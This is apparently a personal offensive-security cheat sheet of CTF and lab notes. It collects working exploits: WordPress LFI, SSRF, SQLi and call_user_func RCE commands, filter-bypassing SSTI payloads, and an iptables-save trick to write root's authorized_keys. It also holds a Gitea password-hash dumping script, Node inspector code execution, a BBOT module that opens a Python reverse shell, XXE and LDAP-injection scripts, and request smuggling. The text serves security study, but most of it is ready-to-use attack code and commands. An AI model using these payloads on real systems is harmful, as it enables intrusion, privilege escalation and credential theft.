- To exploit it,we need to upload a malicious `.htaccess` that parse jpg files as php and trigger an RCE.

```htaccess
<FilesMatch "\.jpg$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

- Then, upload a malicious jpg with php code saved in it.

-----------------

### Broken Access Control

-----------------

- This covers cases of possible Broken Access Control on WordPress. This includes improper hook/function/code usage inside of the plugin/theme which can be used to access or update sensitive information.
- By default,processes on hook and functions used a plugin don't have permission and nonce value check,that's why developer needs to manually carry out permision check with function like `current_user_can` and nonce check with functions-:

```php
wp_verify_nonce
check_admin_referrer
check_ajax_referrer
```


- The `init` hook allows unauthenticated users to make requests and it is triggered when Wordpress is initialized.
- Vulnerable code-:If a vulnerable function i.e a function that should be for an admin used is hooked to `init`,it can accessed after Wordpress initializtion.

```php
add_action("init", "check_if_update");

function check_if_update(){
    if(isset($_GET["update"])){
        update_option("user_data", sanitize_text_field($_GET_["data"]));
    }
}
```

- Exploitation-:

```bash
curl [url]/?update=1&data=admin
```

- The `admin_init` load functions hooked to it when an admin related function is loaded probably `/wp-admin/admin-ajax.php`.
- Vulnerable code-:

```php
add_action("admin_init", "delete_admin_menu");

function delete_admin_menu(){
    if(isset($_POST["delete"])){
        delete_option("custom_admin_menu");
    }
}
```

- To exploit this, the unauthenticated user just needs to perform a POST request to the admin-ajax.php and admin-post.php endpoints specifying the needed parameter to trigger the delete_option function to remove sensitive data.
- Exploitation-:

```bash
curl [URL]/wp-admin/admin-ajax.php?action=hearbeat -d "delete=1"
```

- `wp_jax_${action}`
- Vulnerable code-:

```php
add_action("wp_ajax_update_post_data", "update_post_data_2");

function update_post_data_2(){
    if(isset($_POST["update"])){
        $post_id = get_post($_POST["id"]);
        update_post_meta($post_id, "data", sanitize_text_field($_POST["data"]));
    }
}
```

- Call the `update_post_data` action with `admin-ajax.php` to access function `updata_post_meta` function to update arbitrary WP Post metadata.
- Exploitation-:
```bash
curl [url]/wp-admin/admin-ajax.php?action=update_post_data&update=1 -d "id=1&data=nice"
```

- `wp_ajax_nopriv_${action}`
- Vulnerable code-:The hook above allows an unauthenticated user to access the action

```php
add_action("wp_ajax_nopriv_toggle_menu_bar", "toggle_menu_bar");

function toggle_menu_bar(){
    if ($_POST["toggle"] === "1"){
        update_option("custom_toggle", 1);
    }
    else{
        update_option("custom_toggle", 0);
    }
}
```
- Exploiting it-:

```bash
curl [url]/wp-admin/admin-ajax.php?action=toggle_menu_bar -d "toggle=1"
```

- The `register_rest_route`
- Sometimes, developers don’t implement a proper permission check on the custom REST API route and use the __return_true string as the permission callback. This makes the custom REST API route to be publicly accessible.Vulnerable code-:

```php
add_action( 'rest_api_init', function () {
  register_rest_route( 'myplugin/v1', '/delete/author', array(
    'methods' => 'POST',
    'callback' => 'delete_author_user',
    'permission_callback' => '__return_true',
  ) );
} );

function delete_author_user($request){
    $params = $request->get_params();
    wp_delete_user(intval($params["user_id"]));
}
```

- Any unauthenticated user can make a request to the endpoint `myplugin/v1/delete/author` which calls a function for deleting a user.

```bash
curl [url]/myplugin/v1/delete/author -d "user_id=0"
```

-----------

### Local File Include

------------

- Vulnerable functions-:

```php
include()
include_once()
require()
require_once()
```

- Vulnerable code-:

```php
add_action("wp_ajax_nopriv_render_lesson", "render_lesson_template");

function render_lesson_template(){
    $template_path      = urldecode( $_GET['template_path'] ?? '' );

    // For custom template return all list of lessons
    include $template_path;
    die();
}
```

- To exploit, a request will  be made to `/wp-admin/admin-ajax.php` with an action `render_lesson` since the hook is `wp_ajax_nopriv`, the attack does not require authentication.The hook call function `render_lesson_template` with query `template_path`  to passed to function `include()`.
- Proof of Concept

```bash
curl [url]/wp-admin/admin-ajax.php?action=render_lesson&template_path=/etc/passwd
```

--------------------

### SERVER SIDE REQUEST FORGERY

--------------------

- This bug involves improper url handling. This includes improper URL fetch handling inside of the plugin/theme which can be used to perform unauthorized actions or access to data within the organization. This can be in the vulnerable application, or on other back-end systems that the application can communicate with.
- Useful functions[php]-:

```php
file_get_contents
readfile
fopen
stream_get_contents
cURL
```

- Wordpress related-:

```php
wp_remote_head
wp_remote_get
wp_remote_post
wp_remote_request
```

- Vulnerable code-:

```php
add_action("wp_ajax_nopriv_fetch_image_url", "fetch_image_url");

function fetch_image_url(){
    $response = wp_remote_get($_GET["image_url"]);
    $image_data = wp_remote_retrieve_body($response);
    echo $image_data;
    die();
}
```

- Exploiting it-:

```bash
curl [url]/wp-admin/admin-ajax.php?action=fetch_image_url&image_url=http://localhost:8080
```

----------------

### REMOTE CODE EXECUTION

-----------------

-  This includes improper usage of functions inside of the plugin/theme which can be used to directly execute code or command on the server.
-  Vulnerable functions-:

```php
system()
exec()
shell_exec()
passthru()
proc_open()
eval()
call_user_func()
call_user_func_array()
create_function() //DEPRECATED as of PHP 7.2.0, and REMOVED as of PHP 8.0.0
```
- Php also supports a dynamic function call where we can execute a function from a string or variable.e.g

```php
$action_type = $_GET["action"];
$input = $_GET["input"];
$result = $action_type($input);
echo $result;
```
- Vulnerable code-:

```php
function image_render_callback($atts) {
  $atts = shortcode_atts( array(
    'sanitize' => 'esc_attr',
    'src'=>'',
        'text'=>''
  ), $atts);

    $chosen_callback = "esc_attr";
    $sanitize_callback = array("trim", "esc_attr", "esc_html", "sanitize_text_field");
    if(!in_array($atts["sanitize"], $sanitize_callback)){
        $chosen_callback = $atts["sanitize"];
    }

    if ( ! empty( $chosen_callback ) && is_callable( $chosen_callback ) ) {
        $text = call_user_func( $chosen_callback, $atts["text"] );
    }

    return sprintf("<img src='%s'>%s</img>", esc_attr($atts["src"]), esc_html($text));

}

add_shortcode("imagerender", "image_render_callback");
```

- `call_user_func` is vulnerble to RCE.To exploit this, the Contributor+ role user simply needs to create a drafted post with the below content to trigger RCE via call_user_func function:

```wordpress
[imagerender src="https://patchstack.com" sanitize="system" text="cat /etc/passwd"]
```

------------------

### SQL Injection

------------------

- This includes improper usage of functions and user input handling inside of the plugin/theme which can be used to inject a malicious query into the SQL execution to leak sensitive data.
- Vulnerable functions-:

```php
$wpdb->query
$wpdb->get_var
$wpdb->get_cols
$wpdb->get_results
```

- Vulnerable code-:

```php
add_action("wp_ajax_nopriv_load_questions", "load_questions");

function load_questions(){
    global $wpdb;

    $quiz_id = $_GET["quiz_id"];

    if ( isset($_COOKIE[ 'question_ids_'.$quiz_id ]) ) {
        $question_sql = sanitize_text_field( wp_unslash( $_COOKIE[ 'question_ids_'.$quiz_id ] ) );
    }else {
        $question_ids = array("1","2","3");
        $question_sql = implode( ',', $question_ids );
    }

    $order_by_sql = 'ORDER BY FIELD(question_id,'.$question_sql.')';

    $query     = $wpdb->prepare( "SELECT * FROM {$wpdb->prefix}custom_questions WHERE question_id IN (%1s)", $question_sql);
    $questions = $wpdb->get_results( stripslashes( $query ) );

    wp_send_json($questions);
}
```

- The vulnerable variable is `$question_sql` and the point of exploitation is the cookie's query `'questions_ids_'.$quiz_id`.The vulnerable function is also `$wpdb->get_results()`

```bash
curl [url]/wp-admin/admin-ajax.php?action=load_questions&quiz_id=1 -H "Cookie: question_ids_1=[point_of_injection]"
```

-------------

### Magic Quotes

--------------

- Magic Quotes is/was a feature in PHP designed to automatically escape certain characters in user input to prevent SQL injection (SQLi) attacks. Specifically, it would escape single quotes (’), double quotes (”), backslashes (), and NULL characters by automatically adding backslashes before them. This was done to protect against common vulnerabilities like SQL injection, where an attacker might try to insert malicious SQL code into a query.It was optional for PHP but it is disabled. Why we are mentioning it here? It still lives in WordPress via `wp_magic_quotes()`.
- As mentioned on that page, it is a private function so developers don’t need to implement it. If any code is executed inside WordPress hooks, inputs ($_GET, $_POST, $_COOKIE, and $_SERVER) will go through the add_magic_quotes() which will be sanitized by `addslashes()`.So even a super simple vulnerable-looking code like `select * from users where '$injection_here';` will be escaped and turn into something like `SELECT * FROM users where '\'testpayload';` inside a WordPress hook and you will not be able to exploit it in almost all scenarios.
- It will only exploitable if the `wp_unslash()` function is used to remove all slashes.Vulnerable code-:

```php
add_action('init', function() {
    $input = wp_unslash($_POST['input']);
    global $wpdb;
    $query = "SELECT * FROM users WHERE name = '$input'";
    $result = $wpdb->get_results($query);
    // Display the result
    if ($result) {
        foreach ($result as $row) {
            echo "User: " . esc_html($row->name);
        }
    }
});
```

- Exploting it-:

```bash
curl [url]/ -d "input=' or 1=1--+ "
```

------------------

### Reference for all WP vulns

------------------

- [Patchstack](https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/#introduction)

-----------------

### SSTI bypass with attr() if [] is filtered

------------------

- The payload below allows gain RCE in SSTI with multiple classes available, if you can call `__init__` with a class,you should be able to call `__builtins__` directly or call `__builtins__` with `__globals__`.The function `__builtins__` will be used to access `__import__` to trigger `RCE`.

```flask
()|attr('\x5f\x5f\x63lass\x5f\x5f')|attr('\x5f\x5f\x62ase\x5f\x5f')|attr('\x5f\x5fsub\x63lasses\x5f\x5f')()|attr('\x5f\x5f\x67etitem\x5f\x5f')(356)('ls',shell=True,stdout=-1)|attr('communicate')()
```

- Exploiting without subprocess

```flask
()|attr(%27\x5f\x5f\x63lass\x5f\x5f%27)|attr(%27\x5f\x5f\x62ase\x5f\x5f%27)|attr(%27\x5f\x5fsub\x63lasses\x5f\x5f%27)()|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(333)|attr(%27\x5f\x5finit\x5f\x5f%27)|attr(%27\x5f\x5fbuiltins\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fimport\x5f\x5f%27)(%27subprocess%27)|attr(%27Popen%27)(%27ls%27,stdout=-1)|attr(%22communicate%22)()
```

- Pickme

```python
()|attr(%27\x5f\x5f\x63lass\x5f\x5f%27)|attr(%27\x5f\x5f\x62ase\x5f\x5f%27)|attr(%27\x5f\x5fsub\x63lasses\x5f\x5f%27)()|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(333)|attr(%27\x5f\x5finit\x5f\x5f%27)|attr(%27\x5f\x5fglobals\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fbuiltins\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fimport\x5f\x5f%27)(%27subprocess%27)|attr(%27Popen%27)(%27ls%27,stdout=-1)|attr(%22communicate%22)()
```


- Proof of Concept-:
  
- Fuzz the higlighted part with numbers

![image](https://github.com/user-attachments/assets/10291e7a-2baa-4f97-b508-e4d62ed58a6b)

- Filter for success

![image](https://github.com/user-attachments/assets/99ee65e1-4719-4699-af30-85b2fab01407)

- RCE-:

![image](https://github.com/user-attachments/assets/dfc2bd65-d912-4da6-8800-320aedd197a7)

---------------------

### Iptables and iptables-save Arbitrary file overwrite as root

---------------------

- POC-:

![image](https://github.com/user-attachments/assets/23c7cbae-087e-46b9-a3dd-d256c20b110b)

- Script-:

```bash
sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\n[publickey]\n';sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
```
- You can overwrite the `/etc/passwd`,`/root/.ssh/authorized_keys`,`/etc/sudoers` or even create a malicious crontab.

----------------

### Script for dumping pkdf2 hashes from Gita

--------------

- Script-:

```python3
#! /usr/bin/env python3
import sqlite3
from tenlib.transform import *
import sqlite3
import sys
set_message_formatter("Oldschool")
#Preparing Gitea db hashes[pbkdf2]
#opening db
def db_name(db_name: str) -> list:
    try:
       con =sqlite3.connect(db_name)
       cur = con.cursor()
       res = cur.execute("SELECT passwd,salt,name from user")
       return res.fetchall()
    except Exception as e:
         exit("[+] Database doesn't exist")


def process_data(data: list):
    for passwd,salt,name in data:
        passwd = base64.encode(bytes.fromhex(passwd))
        salt = base64.encode(bytes.fromhex(salt))
        hash = f"{name}:sha256:50000:{salt}:{passwd}"
        print(hash)

def main():
    if len(sys.argv) != 2:
        exit("[+]File not provided")

    result = db_name(sys.argv[1])
    process_data(result)

if __name__ == "__main__":
    main()
```

- Usage-:

![image](https://github.com/user-attachments/assets/912ea2d3-ecb2-4b56-b432-da1d630b859c)

------------------

### NODE INSPECTOR/CEF DEBUG ABUSE

-----------------

- When a nodejs process is started with a `--inspect` option, it listens for a debugging client.By default, it runs on port `9229`. A full URL will look something like `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.
- Ways to start an inspector-:

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

- RCE-:

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> require("child_process").spawnSync("notepad.exe")
```
- Better payload -:
  
```nodejs
require('child_process').execSync('ls',{stdio: 'inherit'})
```
![image](https://github.com/user-attachments/assets/8c7901bc-c047-4f52-90b1-98c7aa22a4d6)

- POC

![image](https://github.com/user-attachments/assets/1c916a15-8da2-43b0-bcef-a7f4220c89f0)

- Post exploitation in a pc with Chrome

```pwsh
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```

------------------------

### BBOT privesc

------------------------

- Create  a `bbot_preset.yml` and edit the module_dir key to a directory with write access-:

![image](https://github.com/user-attachments/assets/cebb2697-8d33-4b29-b4e0-224079bc1f42)

- Create a malicious module  and save in the directory specified in the yml file.The code below spawns a rev shell-:

```python3
import os
from bbot.modules.base import BaseModule

payload = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"\",8001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
class dirty(BaseModule):
     print("I ran your dirty exploit,sensei!!!!")
     os.system(payload)
```

- Load your custom preset,the module name is `dirty` based on the class name and the python's file name-:

![image](https://github.com/user-attachments/assets/b8d2dfa7-488b-4766-9f80-9cd6b2f18f8f)

- Revshell popped-:

![image](https://github.com/user-attachments/assets/133fd2a8-4507-46da-ba8b-713a74cce02a)

----------------

### XXE bypass with utf-7

---------------

- utf-8 code-:

```xml
<!DOCTYPE foo [<!ENTITY example SYSTEM "/app/flag.txt"> ]><data><weight>&example;</weight><height>100</height></data>
```

- Convert it with `iconv`,Syntax-:

```bash
iconv -f utf-8 -t utf-7 < me.xml
```

![image](https://github.com/user-attachments/assets/ab77a9f7-3bcb-4847-9765-f4e5583431fa)

- Add this header before you make the request

```xml
<?xml version="1.0" encoding="UTF-7"?>
```

- Full Code-:

```xml
<?xml version="1.0" encoding="UTF-7"?>+ADwAIQ-DOCTYPE foo +AFsAPAAh-ENTITY example SYSTEM +ACI-/app/flag.txt+ACIAPg +AF0APgA8-data+AD4APA-weight+AD4AJg-example+ADsAPA-/weight+AD4APA-height+AD4-100+ADw-/height+AD4APA-/data+AD4-
```

![image](https://github.com/user-attachments/assets/40aef5aa-bdf4-4435-9354-cc62f31ed446)

- Reading `/etc/passwd`-:

![image](https://github.com/user-attachments/assets/d73eb9ab-27d1-46c1-a69c-b90f9aa48bae)

---------------------

### Bypassing escapeshellcmd() in php

---------------------

- Vulnerable code-:

```php
$safe_filename = escapeshellcmd($filename);
$output = shell_exec("find /var/ -iname " . $safe_filename . " 2>&1");
```

- Solve to execute file and read file-:

```php
sth -or -exec cat /etc/passwd ; -quit
```

- Solve-:

![image](https://github.com/user-attachments/assets/7590e3ea-c001-4620-aab4-a9508bb7587d)


---------------------

### Executing python code within comments [TexSAW 2025]

-------------------

- Python has a feature that can allow you specify a comment that specify a directive to interpret the code based on an encoding.This allows you to incorporate non-ASCII characters.One of these supported codecs is raw_unicode_escape, which allows you to intersperse Unicode escape sequences like \u265F for a black chess pawn Unicode character. You can also encode arbitrary ASCII characters this way, such as a newline (\u000a).Final script-:

```
# coding: raw_unicode_escape
#\u000aimport os
#\u000aos.system("ls -lah")
#\u000aos.system("cat /flag.txt")
```

- Solution for Texsaw-:

```
#! /usr/bin/env python3
from pwn import *
svr = remote("74.207.229.59",20240)
payloads = [b"coding: raw_unicode_escape",b"\\u000aimport os",b"\\u000aos.system(\"cat /flag.txt\")",b"\\u000aos.system(\"cat /*/*\")"]
for index,j in enumerate(payloads):
   svr.recv()
   svr.sendline(str(index).encode())
   svr.recv()
   svr.sendline(j)
   svr.recv()
   if index+1 == len(payloads):
      svr.sendline(b'N')
      print(svr.recv().decode())
   else:
      svr.sendline(b'y')

svr.close()
```

- Proof-:

![image](https://github.com/user-attachments/assets/d151359d-29c2-4b3e-80c9-709e94a8ff5b)

-------------------

### Reference-:

-------------------

- [Kjcolley7](https://github.com/kjcolley7/CTF-WriteUps/blob/master/2021/thcon/TheHiddenOne/README.md)

------------------

### Python Sandbox bypass

------------------

- [Jorian](https://book.jorianwoltjer.com/languages/python)

------------------

### Ironstone's binexp notes

-------------------

- [Ironstone](https://ir0nstone.gitbook.io/notes/binexp/stack/introduction)

-------------------

### HTTP Request Smuggling

--------------------

- HTTP Request smuggling requires interfering with the way websites processes with sequences of http requests.It is associated with HTTP/1 requests. However, websites that support HTTP/2 may be vulnerable, depending on their back-end architecture.

---------------------

### What happens in a Request Smuggling attack

-------------------

- Today's web applications employ chains of web servers between users and application logic.Users send requests to a front end server(called a load balancer or a reverse proxy) and this server forwards requests to one or more back-end servers. This type of architecture is increasingly common, and in some cases unavoidable, in modern cloud-based applications.When the front-end server forwards HTTP requests to a back-end server, it typically sends several requests over the same back-end network connection, because this is much more efficient and performant. The protocol is very simple; HTTP requests are sent one after another, and the receiving server has to determine where one request ends and the next one begins
- In this scenario. the back end and front end server must agree on boundaries of requests or an attacker might be able to create an ambiguous request that will be translated differently by both servers.

----------------------

### How Request Smuggling vulnerabilities arise

--------------------

- Most Request smuggling vulnerabilities occurs because `HTTP/1` specification provides 2 different ways where a request ends: The `Content-Length` and the `Transfer-Encoding` headers.
- The `Content-Length` is straight forward.It specifies the body length of a request.

```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

- `Transfer-Encoding` can be used to specify the message body through `chunked encoding`.This means the message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents. The message is terminated with a chunk of size zero. For example:

```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

- Most security testers are unaware of `Transfer-Encoding` due to 2 reasons-:
  -  Burpsuite automatically unpacks chunked body to make it readable
  -  Browsers do not normally use chunked encoding in requests, and it is normally seen only in server responses.

- As the HTTP/1 specification provides two different methods for specifying the length of HTTP messages, it is possible for a single message to use both methods at once, such that they conflict with each other. The specification attempts to prevent this problem by stating that if both the Content-Length and Transfer-Encoding headers are present, then the Content-Length header should be ignored. This might be sufficient to avoid ambiguity when only a single server is in play, but not when two or more servers are chained together. In this situation, problems can arise for two reasons:
   -  Some servers do not support the `Transfer-Encoding` header in requests.
   -  Some servers that do support the `Transfer-Encoding` header can be induced not to process it if the header is obfuscated in some way.

---------------

### Exploiting Request Smuggling Vulnerabilities

----------------

- Classic request smuggling involves placing both the Content-Length header and the Transfer-Encoding header into a single HTTP/1 request and manipulating these so that the front-end and back-end servers process the request differently. The exact way in which this is done depends on the behavior of the two servers:
  -  CL-TE: The front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
  -  TE.TE: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.
  -  TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.

-  Note-: These techniques are only possible using HTTP/1 requests. Browsers and other clients, including Burp, use HTTP/2 by default to communicate with servers that explicitly advertise support for it during the TLS handshake.As a result, when testing sites with HTTP/2 support, you need to manually switch protocols in Burp Repeater. You can do this from the Request attributes section of the Inspector panel.

----------------

### CL:TE vulnerability

----------------

- Switching between `HTTP/1.1` and `HTTP/2` in burpsuite

![image](https://github.com/user-attachments/assets/9327bbbf-e690-40e3-99dc-81695d30bd07)

- The frontend server allows `GET` and `POST` requests and determines body length with `CONTENT-LENGTH` and the backend server uses `Transfer-Encoding`.
- Solving the lab-:
- The [Transfer-Encoding]first chunk is specified as having 0 length.Any request smuggled after the `0` char is interpreted as a new request.

![image](https://github.com/user-attachments/assets/810abc25-4c2c-46e9-8477-60ebc50885f0)

- You'll notice that the char after `0` gets interpreted by the back-end server and raises an `unknown-header error`.

-----------------

### TE-CL vulnerability

----------------

- Here the front-end server uses the `Transfer-Encoding` while the backend server uses the `Content-Length` header to determine body length.It can be carried out as follows:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```
- The char must be followed by the trailing slash sequence `\r\n\r\n`,Ensure `update content-length` is unchecked
- Main idea-:
- Create a chunked requeste.g

```http
POST / HTTP/1.1
Host: 0a840084034a88008123fc40002200ab.web-security-academy.net
Cookie: session=fkJmh9avyVpYemUQDiwdtKtNezdcQOWr
Content-Length: 3
Transfer-Encoding: chunked

53
GPOST / HTTP/1.1
Host: 0a840084034a88008123fc40002200ab.web-security-academy.net

0
```

- The main stuff is to ensure that Content-Length should only read transfer-encoding amount of bytes `53`,the content-length will be set to 3.Then,the next chunk will be interpreted as a new request by the server.Don't forget that 53 is hex encoded.Don't forget to add space after the next smuggled request because it is required in  requests with the Content-Length body.

![image](https://github.com/user-attachments/assets/d38be86d-9b58-4343-88eb-a4615432608c)


-------------------

### TE:TE-: Transfer-Encoding: Transfer Encoding

--------------------

- Here, the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.
- Obfuscation method for `Transfer-Encoding` header-:

```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```
- The main idea is to obfuscate the second `Transfer-Encoding` header with `Transfer-Encoding: x` so that it can be passed to the backend server..Then, create a normal `chunked` request with the smuggled request in the body.

![image](https://github.com/user-attachments/assets/1ceec8c0-4231-4736-b015-1070bd13489b)

- Then, create a classic `TC:CL` smuggling request by setting `Content-Lenght` to read the chunked request's number of bytes.

![image](https://github.com/user-attachments/assets/aac9359b-2873-421d-baef-6f08dbb1750b)

---------------------

### Web Socket Vulnerabilities

----------------------

- WebSockets are widely used in modern web applications. They are initiated over HTTP and provide long-lived connections with asynchronous communication in both directions.WebSockets are used for all kinds of purposes, including performing user actions and transmitting sensitive information. Virtually any web security vulnerability that arises with regular HTTP can also arise in relation to WebSockets communications.
- Manipulating websockets generally involves manipulating them in ways that are not expected.Burpsuite can be used to-:
 - Intercept and modify WebSocket messages.
 - Replay and generate new WebSocket messages.
 - Manipulate WebSocket connections.

---------------------

### Web sockets vulnerabilities

---------------------

- In principle, practically any web security vulnerability might arise in relation to WebSockets:
- User-supplied input transmitted to the server might be processed in unsafe ways, leading to vulnerabilities such as SQL injection or XML external entity injection.
- Some blind vulnerabilities reached via WebSockets might only be detectable using out-of-band (OAST) techniques.
- If attacker-controlled data is transmitted via WebSockets to other application users, then it might lead to XSS or other client-side vulnerabilities.

--------------------

### Exploiting web sockets vulnerabilities

--------------------

- For example, suppose a chat application uses WebSockets to send chat messages between the browser and the server. When a user types a chat message, a WebSocket message like the following is sent to the server:

```json
{"message":"Hello Carlos"}
```
- The contents of the message are transmitted (again via WebSockets) to another chat user, and rendered in the user's browser as follows:

```json
<td>Hello Carlos</td>
```
- In this situation, provided no other input processing or defenses are in play, an attacker can perform a proof-of-concept XSS attack by submitting the following WebSocket message:

```json
{"message":"<img src=1 onerror='alert(1)'>"}
```

---------------

### SSTI [Server Side Request Forgery]

---------------

- Twig SSTI sink->

```php
$output = $twig->render("Dear " . $_GET['name']);
```
- User's input is concatenated with a template.It can be exploited this way.

```
curl <url>/?name={{bad-stuff}}
```

- You can identify SSTI by fuzzing this characters `${{<%[%'"}}%\` till you get an error that might identify the template.If fuzzing was inconclusive, a vulnerability may still reveal itself using one of these approaches. Even if fuzzing did suggest a template injection vulnerability, you still need to identify its context in order to exploit it.
- Plaintext Approach-: Most template languages allow you to freely input content either by using HTML tags directly or by using the template's native syntax, which will be rendered to HTML on the back-end before the HTTP response is sent. For example, in Freemarker, the line render('Hello ' + username) would render to something like Hello Carlos.This can sometimes be exploited for XSS and is in fact often mistaken for a simple XSS vulnerability. However, by setting mathematical operations as the value of the parameter, we can test whether this is also a potential entry point for a server-side template injection attack.For example, consider a template that contains the following vulnerable code:

```java
render('Hello ' + username)
```

- If we try `${7*7}` and we get `49`,it indicates SSTI vulnerability.
- Codetext approach-: Sometimes it is revealed through the code .User input might be placed in a template expression as seen below.This may take the form of a user-controllable variable name being placed inside a parameter, such as:

```
greeting = getQueryParameter('greeting')
engine.render("Hello {{"+greeting+"}}", data)
```

- The url  will be like and render `Hello Carlos`

```
http://vulnerable-website.com/?greeting=data.username
```
- This context is easily missed during assessment because it doesn't result in obvious XSS and is almost indistinguishable from a simple hashmap lookup. One method of testing for server-side template injection in this context is to first establish that the parameter doesn't contain a direct XSS vulnerability by injecting arbitrary HTML into the value:
- In the absence of XSS, this will usually either result in a blank entry in the output (just Hello with no username), encoded tags, or an error message. The next step is to try and break out of the statement using common templating syntax and attempt to inject arbitrary HTML after it:

```
http://vulnerable-website.com/?greeting=data.username}}<tag>
```

- If this again results in an error or blank output, you have either used syntax from the wrong templating language or, if no template-style syntax appears to be valid, server-side template injection is not possible. Alternatively, if the output is rendered correctly, along with the arbitrary HTML, this is a key indication that a server-side template injection vulnerability is present:

```
Hello Carlos<tag>
```

- Once you have detected the template injection potential, the next step is to identify the template engine.Although there are a huge number of templating languages, many of them use very similar syntax that is specifically chosen not to clash with HTML characters. As a result, it can be relatively simple to create probing payloads to test which template engine is being used.Simply submitting invalid syntax is often enough because the resulting error message will tell you exactly what the template engine is, and sometimes even which version. For example, the invalid expression <%=foobar%> triggers the following response from the Ruby-based ERB engine:

```
(erb):1:in `<main>': undefined local variable or method `foobar' for main:Object (NameError)
from /usr/lib/ruby/2.5.0/erb.rb:876:in `eval'
from /usr/lib/ruby/2.5.0/erb.rb:876:in `result'
from -e:4:in `<main>'
```

- Decision tree to determine `SSTI`-:

![image](https://github.com/user-attachments/assets/e252cf9b-4deb-4f1d-a048-86adeafe2c7d)

- You should be aware that the same payload can sometimes return a successful response in more than one template language. For example, the payload {{7*'7'}} returns 49 in Twig and 7777777 in Jinja2. Therefore, it is important not to jump to conclusions based on a single successful response.

--------------

### SSTI in ERB

--------------

- Executing code in erb is with `<%=code %>`
- Try to read files-:

```ruby
 <%= File.open('/etc/passwd').read %>
```

![image](https://github.com/user-attachments/assets/81e01589-2478-4d41-86ad-78d332a44ac8)

- Next step is enumerate methods and classes with `self`.

```ruby
<%= self %>
```

![image](https://github.com/user-attachments/assets/2acc19d9-bd28-4563-bbed-bd89d00ff8ff)

- Obtaining the class name

```ruby
<%= self.class.name %>
```

![image](https://github.com/user-attachments/assets/998dc164-e35c-485b-8cc5-a696ee904091)

- Command injection-:

```ruby
<%= system("whoami"); %>
```

![image](https://github.com/user-attachments/assets/e05b4b30-cfc8-4622-abf8-68bde69216f4)

- Solution-:

```ruby
<%=system(%27rm+morale.txt%27)%>
```

![image](https://github.com/user-attachments/assets/ce114a9c-20d9-43ef-bb67-ef7c0d425718)

--------------

### Reference

--------------

- [HDKS](https://exploit-notes.hdks.org/exploit/web/security-risk/erb-ssti/)
  
--------------

### SSTI in Tornado[Code Context]

-------------

- Tornado template syntax according to the documentation, Syntax is `{{}}`

```python
t = template.Template("<html>{{ myvalue }}</html>")
print(t.generate(myvalue="XXX"))
```
- Tornado is so interesting that we can execute python directly within the tags. You can call `__import__` straightup and pick up your desired module.

```
{{__import__('os').popen('rm+morale.txt').read()}}
```

-----------

### Reference-:

------------

- [Tornado's template docs](https://www.tornadoweb.org/en/stable/template.html)

------------

### Ldap Injection

------------

- Just like sqli, it involves injecting a malicious statement into a ldap query.You'll notice that the variables `username` and `password` are passed into the ldap query unfiltered.

```python3
if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        server = Server('localhost', port=389, get_info=ALL)

        conn = Connection(server, 
                          user=f'cn=admin,dc=bts,dc=ctf',
                          password=ADMIN_PASSWORD,
                          auto_bind=True)
if not conn.bind():
            return 'Failed to connect to LDAP server', 500

        conn.search('ou=people,dc=bts,dc=ctf', f'(&(employeeType=active)(uid={username})(userPassword={password}))', attributes=['uid'])
```

- Authentication bypass, Use-:

```ldap
user=*)(uid=*)(uid=*&password=*
```

- The query shown below will be the final result after injecting the payload, the result will be Boolean `true` which will bypass authentication

```
(&(employeeType=active)(uid=*)(uid=*)(uid=*)(userPassword={password}))
```

- Authentication Bypass-:

![image](https://github.com/user-attachments/assets/ffea8d70-cb58-4fb5-bb37-e93dd4d88838)

- You can exfiltrate data by bruteforcing chars with "(field)=(char)*".

```
(Description=a*)
```

- Script-:

```python3
#! /usr/bin/env python3
import requests
import string
charset = string.ascii_lowercase + string.digits+"{}_"
url="https://lightweight.chal.bts.wh.edu.pl"
flag="BtSCTF{"
while True:
	for i in charset:
		payload = f"*)(uid=*)(Description={flag+i}*)(uid=*"
		data = {"username":payload,"password":"*"}
		status = requests.post(url,data=data).text
		if "Invalid credentials" in status:
			pass
		elif "User Description" in status:
			flag +=i
			print(f"[+] Found char:{flag}")
			break
